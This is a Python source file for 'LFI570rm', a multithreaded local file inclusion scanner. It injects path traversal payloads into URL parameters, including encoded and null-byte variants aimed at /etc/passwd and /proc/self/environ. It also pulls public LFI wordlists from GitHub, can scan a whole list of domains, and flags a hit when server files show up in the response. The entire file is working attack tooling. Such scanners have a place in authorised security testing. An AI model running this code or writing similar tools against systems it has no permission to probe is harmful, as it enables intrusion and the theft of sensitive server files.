#!/usr/bin/env python3
"""
LFI570rm - Advanced LFI Vulnerability Scanner
Author: BL4CK_570RM
Version: 1.1
"""

import argparse
import requests
import sys
import os
import time
import logging
import json
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='lfi_scanner.log'
)

# Tool banner
BANNER = f"""
{Fore.RED}
$$\       $$$$$$$$\ $$$$$$\ $$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$$\  $$\      $$\ 
$$ |      $$  _____|\_$$  _|$$  ____| \____$$  |$$$ __$$\ $$  __$$\ $$$\    $$$ |
$$ |      $$ |        $$ |  $$ |          $$  / $$$$\ $$ |$$ |  $$ |$$$$\  $$$$ |
$$ |      $$$$$\      $$ |  $$$$$$$\     $$  /  $$\$$\$$ |$$$$$$$  |$$\$$\$$ $$ |
$$ |      $$  __|     $$ |  \_____$$\   $$  /   $$ \$$$$ |$$  __$$< $$ \$$$  $$ |
$$ |      $$ |        $$ |  $$\   $$ | $$  /    $$ |\$$$ |$$ |  $$ |$$ |\$  /$$ |
$$$$$$$$\ $$ |      $$$$$$\ \$$$$$$  |$$  /     \$$$$$$  /$$ |  $$ |$$ | \_/ $$ |
\________|\__|      \______| \______/ \__/       \______/ \__|  \__|\__|     \__
{Fore.YELLOW}Advanced LFI Vulnerability Scanner{Style.RESET_ALL}
{Fore.CYAN}Version: 1.1 | Author: BL4CK_570RM{Style.RESET_ALL}
"""

# Default payload sources
DEFAULT_PAYLOAD_SOURCES = [
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/BSD-files.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/LFI-FD-check.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/LFI-WindowsFileCheck.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Linux-files.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/List_Of_File_To_Include_NullByteAdded.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Mac-files.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Traversal.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Web-files.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Windows-files.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/php-filter-iconv.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/simple-check.txt"
]

class LFIScanner:
    def __init__(self, config_file=None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.timeout = 10
        self.verbose = False
        self.results = []
        self.payload_sources = DEFAULT_PAYLOAD_SOURCES
        self.wordlist_dir = "wordlists"
        
        # Create wordlists directory if not exists
        if not os.path.exists(self.wordlist_dir):
            os.makedirs(self.wordlist_dir)
        
        # Load custom payload sources from config file if provided
        if config_file and os.path.exists(config_file):
            self.load_config(config_file)

    def load_config(self, config_file):
        """Load payload sources from a configuration file"""
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                if 'payload_sources' in config:
                    self.payload_sources = config['payload_sources']
                    logging.info(f"Loaded {len(self.payload_sources)} payload sources from config")
        except Exception as e:
            logging.error(f"Failed to load config file: {e}")
            print(f"{Fore.RED}[-] Failed to load config file: {e}{Style.RESET_ALL}")

    def download_payloads(self):
        """Download payloads from specified sources"""
        payloads = []
        for source in self.payload_sources:
            try:
                logging.info(f"Downloading payloads from {source}")
                print(f"{Fore.YELLOW}[!] Downloading payloads from {source}...{Style.RESET_ALL}")
                response = self.session.get(source, timeout=self.timeout)
                response.raise_for_status()
                
                # Save payload file locally
                filename = os.path.join(self.wordlist_dir, source.split('/')[-1])
                with open(filename, 'wb') as f:
                    f.write(response.content)
                
                # Read and add payloads
                with open(filename, 'r', errors='ignore') as f:
                    payloads.extend([line.strip() for line in f if line.strip()])
                print(f"{Fore.GREEN}[+] Successfully downloaded payloads from {source}{Style.RESET_ALL}")
            except Exception as e:
                logging.error(f"Failed to download payloads from {source}: {e}")
                print(f"{Fore.RED}[-] Failed to download payloads from {source}: {e}{Style.RESET_ALL}")
        
        return payloads

    def load_wordlist(self, wordlist_path=None):
        """Load payloads from local wordlist or download from sources"""
        if wordlist_path and os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, 'r', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception as e:
                logging.error(f"Error loading wordlist: {e}")
                print(f"{Fore.RED}[-] Error loading wordlist: {e}{Style.RESET_ALL}")
                sys.exit(1)
        else:
            return self.download_payloads()

    def check_lfi_vulnerability(self, url, payload):
        """Check for LFI vulnerability with a specific payload"""
        try:
            test_url = url.replace("FUZZ", payload)
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for common LFI indicators in response
            indicators = [
                "root:x:0:0", "/etc/passwd", "bin/bash",
                "Permission denied", "No such file or directory"
            ]
            error_patterns = [
                "PHP Warning", "include()", "require()", 
                "failed to open stream"
            ]
            
            if any(indicator in response.text for indicator in indicators) or \
               any(pattern in response.text for pattern in error_patterns):
                return True, test_url, response.status_code
                
            return False, None, None
        except requests.RequestException as e:
            if self.verbose:
                logging.warning(f"Request failed for {payload}: {e}")
                print(f"{Fore.YELLOW}[!] Request failed for {payload}: {e}{Style.RESET_ALL}")
            return False, None, None

    def scan_url(self, url):
        """Scan a single URL for LFI vulnerabilities"""
        logging.info(f"Scanning URL: {url}")
        print(f"{Fore.CYAN}[*] Scanning URL: {url}{Style.RESET_ALL}")
        
        # Check if URL has parameters
        parsed = urlparse(url)
        if not parsed.query:
            logging.warning("URL has no parameters to test")
            print(f"{Fore.YELLOW}[!] URL has no parameters to test{Style.RESET_ALL}")
            return
        
        # Prepare URL for fuzzing
        param = parsed.query.split('=')[0]
        fuzz_url = url.replace(f"{param}=", f"{param}=FUZZ")
        
        # Test with common LFI payloads
        print(f"{Fore.BLUE}[*] Testing common LFI payloads...{Style.RESET_ALL}")
        common_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/proc/self/environ",
            "/proc/self/cmdline"
        ]
        
        for payload in common_payloads:
            vulnerable, test_url, status_code = self.check_lfi_vulnerability(fuzz_url, payload)
            if vulnerable:
                logging.info(f"LFI Vulnerability Found: {test_url} (Status: {status_code})")
                print(f"{Fore.GREEN}[+] LFI Vulnerability Found: {test_url} (Status: {status_code}){Style.RESET_ALL}")
                self.results.append(test_url)
                return
        
        # Try with wordlist payloads
        print(f"{Fore.BLUE}[*] Starting fuzzing with wordlist...{Style.RESET_ALL}")
        wordlist = self.load_wordlist()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.check_lfi_vulnerability, fuzz_url, payload) for payload in wordlist]
            for future in futures:
                vulnerable, test_url, status_code = future.result()
                if vulnerable:
                    logging.info(f"LFI Vulnerability Found: {test_url} (Status: {status_code})")
                    print(f"{Fore.GREEN}[+] LFI Vulnerability Found: {test_url} (Status: {status_code}){Style.RESET_ALL}")
                    self.results.append(test_url)
                    break

    def scan_from_file(self, file_path):
        """Scan multiple URLs from a file"""
        try:
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                self.scan_url(url)
        except FileNotFoundError:
            logging.error(f"File not found: {file_path}")
            print(f"{Fore.RED}[-] File not found: {file_path}{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            logging.error(f"Error reading file: {e}")
            print(f"{Fore.RED}[-] Error reading file: {e}{Style.RESET_ALL}")
            sys.exit(1)

    def update_tool(self):
        """Update the tool from GitHub"""
        logging.info("Checking for updates")
        print(f"{Fore.YELLOW}[!] Checking for updates...{Style.RESET_ALL}")
        try:
            # Placeholder for actual update logic
            print(f"{Fore.GREEN}[+] Tool is up to date{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Update failed: {e}")
            print(f"{Fore.RED}[-] Update failed: {e}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description="LFI570rm - Advanced LFI Vulnerability Scanner")
    parser.add_argument('-dl', '--domain-list', help="File containing list of URLs to scan")
    parser.add_argument('-u', '--url', help="Single URL to scan")
    parser.add_argument('-w', '--wordlist', help="Custom wordlist path")
    parser.add_argument('-c', '--config', help="Configuration file with payload sources")
    parser.add_argument('-up', '--update', action='store_true', help="Update the tool")
    parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
    parser.add_argument('-o', '--output', help="Output file to save results")
    parser.add_argument('-t', '--threads', type=int, default=10, help="Number of threads (default: 10)")
    args = parser.parse_args()

    # Print banner
    print(BANNER)

    scanner = LFIScanner(args.config)
    scanner.verbose = args.verbose

    if args.update:
        scanner.update_tool()
        sys.exit(0)

    if not args.domain_list and not args.url:
        parser.print_help()
        sys.exit(1)

    start_time = time.time()
    
    if args.url:
        scanner.scan_url(args.url)
    if args.domain_list:
        scanner.scan_from_file(args.domain_list)

    if args.output and scanner.results:
        try:
            with open(args.output, 'w') as f:
                for result in scanner.results:
                    f.write(f"{result}\n")
            logging.info(f"Results saved to {args.output}")
            print(f"{Fore.GREEN}[+] Results saved to {args.output}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Failed to save results: {e}")
            print(f"{Fore.RED}[-] Failed to save results: {e}{Style.RESET_ALL}")

    execution_time = time.time() - start_time
    logging.info(f"Scan completed in {execution_time:.2f} seconds. Found {len(scanner.results)} potential LFI vulnerabilities")
    print(f"\n{Fore.GREEN}[+] Scan completed in {execution_time:.2f} seconds. Found {len(scanner.results)} potential LFI vulnerabilities.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
